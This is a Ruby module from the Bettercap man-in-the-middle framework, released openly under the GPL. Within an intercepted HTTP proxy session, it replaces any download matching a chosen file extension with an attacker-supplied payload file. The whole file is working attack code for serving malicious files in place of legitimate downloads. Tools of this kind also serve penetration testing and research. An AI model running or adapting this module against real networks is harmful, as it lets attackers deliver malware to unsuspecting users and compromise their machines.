
=begin
BETTERCAP
Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/
This project is released under the GPL 3 license.
=end

class ReplaceFile < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'ReplaceFile',
    'Description' => 'Replace files being downloaded with a custom one.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  @@extension = nil
  @@filename  = nil
  @@payload   = nil

  def self.on_options(opts)
    opts.on( '--file-extension EXT', 'Extension of the files to replace.' ) do |v|
      @@extension = v
    end

    opts.on( '--file-replace FILENAME', 'File to use in order to replace the ones matching the extension.' ) do |v|
      @@filename = File.expand_path v
      unless File.exists?(@@filename)
        raise BetterCap::Error, "#{@@filename} file does not exist."
      end
      @@payload = File.read(@@filename)
    end
  end

  def initialize
    raise BetterCap::Error, "No --file-extension option specified for the proxy module." if @@extension.nil?
    raise BetterCap::Error, "No --file-replace option specified for the proxy module." if @@filename.nil?
  end

  def on_request( request, response )
    if request.path.include?(".#{@@extension}")
      BetterCap::Logger.info "Replacing http://#{request.host}#{request.path} with #{@@filename}."

      response['Content-Length'] = @@payload.bytesize
      response.body = @@payload
    end
  end
end
